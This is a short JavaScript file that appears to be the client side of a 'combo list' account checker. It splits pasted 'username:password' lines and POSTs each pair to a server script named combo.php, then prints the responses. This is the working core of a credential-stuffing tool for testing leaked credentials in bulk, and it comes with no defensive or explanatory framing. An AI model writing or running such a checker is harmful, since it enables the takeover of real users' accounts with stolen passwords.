function parse_accounts(){
    var accounts = document.getElementById("accounts").value;
    accounts = accounts.split("\n");
    accounts.forEach(check);
}

function check(account){
    var account = account.split(":");
    var username = account[0];
    var password = account[1];
    
    var resultado = document.getElementById("resultado");
    var post = "correo=" + username + "&clave=" + password;

    var query;
    
    if(window.XMLHttpRequest){
        query = new XMLHttpRequest;
    }else{
        query = new ActiveXObject("Microsoft.XMLHTTP");
    }

    query.onreadystatechange = function(){
        if(query.readyState == 4 && query.status == 200){
            resultado.innerHTML += query.responseText;
        }
    }

    query.open("POST", "combo.php", true);
    query.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    query.send(post);

}